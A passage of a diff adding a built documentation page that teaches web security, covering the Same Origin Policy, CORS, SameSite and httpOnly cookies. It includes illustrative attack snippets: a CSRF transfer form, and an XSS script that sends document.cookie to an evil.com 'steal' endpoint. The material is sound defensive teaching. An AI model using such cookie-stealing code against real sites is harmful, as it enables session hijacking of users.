+<li><strong>But</strong> the browser blocks the attacking site's JavaScript from <strong>reading</strong> the response unless the server explicitly authorizes that origin.</li>
+</ul>
+<hr />
+<h2 id="what-is-origin-same-origin-policy-sop">What is <code>Origin</code> (Same Origin Policy — SOP)?<a class="headerlink" href="#what-is-origin-same-origin-policy-sop" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Origin = scheme + host + port
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>https://example.com:443
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>^^^^^   ^^^^^^^^^^^  ^^^
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>scheme     host      port
+</code></pre></div>
+<p>Each part matters:</p>
+<ul>
+<li><strong>Scheme</strong> (http vs https) — different schemes are different origins. This prevents insecure pages from accessing secure resources.</li>
+<li><strong>Host</strong> — different hostnames are different origins (<code>bank.com</code> vs <code>api.bank.com</code>).</li>
+<li><strong>Port</strong> — same host + scheme but different port is a different origin (<code>:443</code> ≠ <code>:8080</code>).</li>
+</ul>
+<p>SOP is strict by default and blocks cross-origin reads. CORS provides a controlled relaxation: the server can explicitly allow specific origins to read its responses.</p>
+<hr />
+<h2 id="cors-controlled-relaxation-of-sop">CORS: controlled relaxation of SOP<a class="headerlink" href="#cors-controlled-relaxation-of-sop" title="Permanent link">&para;</a></h2>
+<p>Server-side example (Express + cors):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cors</span><span class="p">({</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span><span class="nx">origin</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://mysite.com&#39;</span><span class="p">,</span><span class="w">  </span><span class="c1">// only this origin can read responses</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">}));</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1">// Response header sent:</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1">// Access-Control-Allow-Origin: https://mysite.com</span>
+</code></pre></div>
+<hr />
+<h1 id="part-7-samesite-vs-cors-the-complete-picture">Part 7 — <code>SameSite</code> vs CORS — the complete picture<a class="headerlink" href="#part-7-samesite-vs-cors-the-complete-picture" title="Permanent link">&para;</a></h1>
+<p>They protect different attack surfaces:</p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Purpose</th>
+<th>Protects</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SameSite</strong></td>
+<td>Controls whether cookies are <strong>sent</strong></td>
+<td>Protects <strong>actions</strong> (CSRF)</td>
+</tr>
+<tr>
+<td><strong>CORS</strong></td>
+<td>Controls whether JS can <strong>read</strong> responses</td>
+<td>Protects <strong>data</strong> (exfiltration)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h3>
+<p><strong>Action protection (SameSite)</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cm">&lt;!-- You&#39;re on: http://evil.com --&gt;</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://mybank.com/transfer&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;amount&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;10000&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<ul>
+<li>Without <code>SameSite</code>: cookie is sent → transfer could succeed.</li>
+<li>With <code>SameSite='lax'</code> or <code>Strict</code>: cookie is not sent → transfer rejected.</li>
+</ul>
+<p><strong>Data protection (CORS)</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1">// On evil.com</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://mybank.com/account-balance&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">});</span>
+</code></pre></div>
+<ul>
+<li><code>SameSite: Lax</code> allows the GET and sends the cookie.</li>
+<li>Server responds.</li>
+<li><strong>CORS</strong> can block JavaScript on <code>evil.com</code> from reading the response — protecting sensitive data.</li>
+</ul>
+<hr />
+<h2 id="defense-in-depth-use-both">Defense in depth: use both<a class="headerlink" href="#defense-in-depth-use-both" title="Permanent link">&para;</a></h2>
+<p>Example secure cookie + CORS configuration:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1">// Set cookie</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;sessionId&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;abc123&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span><span class="nx">httpOnly</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">   </span><span class="c1">// protects against XSS reading the cookie</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="nx">sameSite</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;lax&#39;</span><span class="p">,</span><span class="w">  </span><span class="c1">// protects against cross-site POST actions</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">  </span><span class="nx">secure</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w">      </span><span class="c1">// only send over HTTPS</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="p">});</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="c1">// CORS: only let trusted origin read responses</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cors</span><span class="p">({</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">  </span><span class="nx">origin</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://mybank.com&#39;</span><span class="p">,</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="p">}));</span>
+</code></pre></div>
+<p>This combination defends against:</p>
+<ul>
+<li>XSS cookie theft (<code>httpOnly</code>)</li>
+<li>CSRF actions (<code>sameSite</code>)</li>
+<li>Cross-site data exfiltration (CORS)</li>
+</ul>
+<hr />
+<h1 id="important-clarification">Important clarification<a class="headerlink" href="#important-clarification" title="Permanent link">&para;</a></h1>
+<p><strong>Q: Does <code>document.cookie</code> return all browser cookies?</strong><br />
+<strong>A:</strong> No — only cookies for the <strong>current domain</strong> are returned.</p>
+<p>Example:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">// On https://mybank.com</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1">// e.g. &quot;sessionId=abc123; userId=456; theme=dark&quot;</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1">// → Only mybank.com cookies</span>
+</code></pre></div>
+<p>However, if an attacker can run JavaScript on your site (XSS), the attacker can still steal non-<code>httpOnly</code> cookies:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://evil.com/steal?cookie=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span><span class="c1">// This can leak sessionId if sessionId is not httpOnly</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Setting <code>httpOnly</code> on session cookies prevents <code>document.cookie</code> from exposing them:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>document.cookie  // &quot;theme=dark&quot;  ← sessionId invisible if httpOnly
+</code></pre></div>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 13, 2025 18:38:00 UTC">November 13, 2025</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 13, 2025 18:38:00 UTC">November 13, 2025</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.annotate"], "search": "assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
